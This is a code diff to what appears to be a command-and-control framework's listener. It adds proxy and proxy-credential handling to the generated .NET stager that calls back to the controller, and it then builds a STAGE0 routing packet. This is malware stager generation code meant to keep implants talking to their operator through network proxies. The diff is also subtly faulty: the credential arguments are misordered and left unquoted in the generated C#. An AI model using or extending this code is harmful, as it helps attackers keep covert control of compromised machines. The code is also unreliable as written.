@@ -524,6 +524,26 @@ class Listener(object):
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
+                if proxy.lower() != 'none':
+                    if proxy.lower() != 'default':
+                        code = code.replace('wc.Proxy = WebRequest.DefaultWebProxy;', 'wc.Proxy = new WebProxy("%s");' % proxy)
+                else:
+                    code = code.replace('wc.Proxy = WebRequest.DefaultWebProxy;', '')
+               
+                if proxyCreds.lower() != 'none':
+                    if proxyCreds.lower() != "default":
+                        username = proxyCreds.split(':')[0]
+                        password = proxyCreds.split(':')[1]
+                        if len(username.split('\\')) > 1:
+                            usr = username.split('\\')[1]
+                            domain = username.split('\\')[0]
+                            code = code.replace('wc.Proxy.Credentials = CredentialCache.DefaultCredentials;', 'wc.Proxy.Credentials = new NetworkCredential(%s,%s,%s);' % (usr,domain,password))
+                        else:
+                            usr = username.split('\\')[0]
+                            code = code.replace('wc.Proxy.Credentials = CredentialCache.DefaultCredentials;', 'wc.Proxy.Credentials = new NetworkCredential(%s,%s);' % (usr,password))
+                else:
+                    code = code.replace('wc.Proxy.Credentials = CredentialCache.DefaultCredentials;', '')
+
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='DOTNET', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
